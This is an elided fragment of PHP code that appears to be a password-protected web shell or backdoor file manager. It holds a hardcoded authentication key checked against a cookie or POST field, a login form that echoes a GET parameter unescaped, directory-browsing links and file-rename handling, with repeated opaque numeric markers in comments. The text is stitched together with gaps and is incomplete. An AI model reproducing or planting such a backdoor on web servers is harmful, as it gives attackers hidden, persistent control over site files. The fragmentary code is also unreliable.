...
$auth_key = "01ddb7564b9278ac0b9d369c627cc188";
...
$pass = false;
if (isset($_COOKIE['pw_name_54861'])) {
    if(($_COOKIE['pw_name_54861']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_54861'])) {
        if(($_POST['pw_name_54861']) == $auth_key) {
            setcookie("pw_name_54861", $_POST['pw_name_54861']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_54861' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774909478 1724682774208233 1724682774455636 1724682774500951
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774909478 1724682774208233 1724682774455636 1724682774500951
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774909478 1724682774208233 1724682774455636 1724682774500951
            $name = PATH . "/" . $_GET['r'];
